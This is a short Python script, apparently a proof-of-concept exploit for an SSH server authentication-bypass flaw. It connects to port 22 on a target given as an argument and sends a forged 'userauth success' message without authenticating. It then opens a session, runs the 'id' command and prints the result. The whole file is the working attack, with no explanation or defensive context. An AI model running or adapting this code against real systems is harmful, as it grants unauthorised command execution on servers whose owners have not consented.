#-*-coding:utf-8-*-

import paramiko
import socket
import sys 

sock = socket.socket()

try:
    sock.connect((sys.argv[1], 22))

    message = paramiko.message.Message()
    transport = paramiko.transport.Transport(sock)
    transport.start_client()
    
    message.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
    transport._send_message(message)
    cmd = transport.open_session()
    cmd.exec_command("id")
    out = cmd.makefile("rb", 4096)
    output = out.read()
    print output


except Exception as e:
    print e
